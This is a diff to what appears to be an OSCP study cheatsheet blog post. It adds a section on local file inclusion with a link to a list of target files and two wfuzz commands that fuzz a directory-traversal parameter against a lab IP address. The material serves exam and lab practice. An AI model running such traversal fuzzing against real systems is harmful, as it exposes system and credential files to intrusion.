@@ -6,7 +6,19 @@ date: "2021-03-04 00:01"
 tags: [OSCP, Cheatsheet]
 layout: post
 ---
- 
+
+###### LFI file lists
+```
+https://github.com/hussein98d/LFI-files
+
+Then use the list to find out which ones work:
+> wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt
+
+Find out how many characters a wrong request is, then filter those out:
+> wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 376
+
+```
+
 ###### PayloadsAllTheThings
 ```
 Directory traversal
